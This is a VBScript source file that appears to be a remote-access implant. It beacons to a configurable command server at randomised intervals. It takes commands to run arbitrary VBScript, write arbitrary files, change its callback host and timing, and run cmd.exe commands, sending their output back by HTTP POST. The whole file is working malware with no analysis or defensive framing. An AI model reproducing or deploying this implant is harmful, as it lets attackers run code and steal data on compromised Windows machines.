Option Explicit
On Error Resume Next
Dim Server, Port, XmlHttpReq, StartOfCommand, EndOfCommand, Command, Shell, ExecObj, FsoObj, Break, Result, UUID, StartOfFilePath, StartOfFileContent, FilePath, FileObj, FileContent, MinWait, MaxWait, WaitTime, CallbackRange, CallbackInterval, ValueStart
Set Shell = CreateObject("WScript.Shell")
Set FsoObj=CreateObject("Scripting.FileSystemObject")
Break = False
UUID = "00000000-0000-0000-0000-000000000000"
Command = ""
Server = "127.0.0.1"
Port = "80"
MinWait = 5000
MaxWait = 8000
While Break <> True
    Command = ""
    Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    XmlHttpReq.Open "GET", "http://" & Server & ":" & Port & "/" & Replace(UUID,"-","/"), false
    XmlHttpReq.Send
    If InStr(XmlHttpReq.responseText, "COMMAND:") Then
        StartOfCommand = InStr(XmlHttpReq.responseText, "COMMAND:")+8
        EndOfCommand = InStr(StartOfCommand, XmlHttpReq.responseText, " ")
        If EndOfCommand = 0 Then
            EndOfCommand = Len(XmlHttpReq.responseText)+1
        End If
        Command = Mid(XmlHttpReq.responseText, StartOfCommand, EndOfCommand-StartOfCommand)
    End If
    If Command = "EXIT" Then
        Break = True
    ElseIf Command = "SETUUID" Then
        UUID = Mid(XmlHttpReq.responseText, EndOfCommand+1, 36)
    ElseIf Command = "SETCALLBACK" Then
        ValueStart = InStr(EndOfCommand+1, XmlHttpReq.responseText, "INTERVAL:")+9
        CallbackInterval = Mid(XmlHttpReq.responseText, ValueStart, InStr(ValueStart, XmlHttpReq.responseText, " ")-ValueStart)
        ValueStart = InStr(ValueStart+1, XmlHttpReq.responseText, "RANGE:")+6
        CallbackRange = Mid(XmlHttpReq.responseText, ValueStart, Len(XmlHttpReq.responseText)-ValueStart)
        MinWait = CInt(CallbackInterval) - CInt(CallbackRange)
        MaxWait = CInt(CallbackInterval) + CInt(CallbackRange)
    ElseIf Command = "SETCALLBACKHOST" Then
        ValueStart = InStr(EndOfCommand+1, XmlHttpReq.responseText, "HOST:")+5
        Server = Mid(XmlHttpReq.responseText, ValueStart, InStr(ValueStart, XmlHttpReq.responseText, " ")-ValueStart)
        ValueStart = InStr(ValueStart+1, XmlHttpReq.responseText, "PORT:")+5
        Port = Mid(XmlHttpReq.responseText, ValueStart, Len(XmlHttpReq.responseText)-ValueStart)
    ElseIf Command = "EXECVBS" Then
        Execute Mid(XmlHttpReq.responseText, EndOfCommand+1, Len(XmlHttpReq.responseText))
    ElseIf Command = "WRITEFILE" Then
        StartOfFilePath = InStr(EndOfCommand+1, XmlHttpReq.responseText, "FILEPATH:")+9
        StartOfFileContent = InStr(StartOfFilePath, XmlHttpReq.responseText, "FILECONTENT:")+12
        FilePath = Mid(XmlHttpReq.responseText, StartOfFilePath, (StartOfFileContent-13)-StartOfFilePath)
        FileContent = Mid(XmlHttpReq.responseText, StartOfFileContent, Len(XmlHttpReq.responseText))
        Set FileObj = FsoObj.CreateTextFile(FilePath,True)
        FileObj.Write FileContent
        FileObj.Close
    ElseIf Command = "CMD" Then
        Set ExecObj = Shell.Exec(("C:\Windows\System32\cmd.exe /c " & Mid(XmlHttpReq.responseText, EndOfCommand+1, Len(XmlHttpReq.responseText))))
        Result = ""
        Do Until ExecObj.StdOut.AtEndOfStream
            Result = Result & ExecObj.StdOut.ReadAll()
        Loop
        Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        XmlHttpReq.Open "POST", "http://" & Server & ":" & Port & "/" & Replace(UUID,"-","/"), false
        XmlHttpReq.Send(Result)
    End If
    Randomize
    WaitTime = Int((MaxWait-MinWait+1)*Rnd+MinWait)
    WScript.Sleep(WaitTime)
Wend
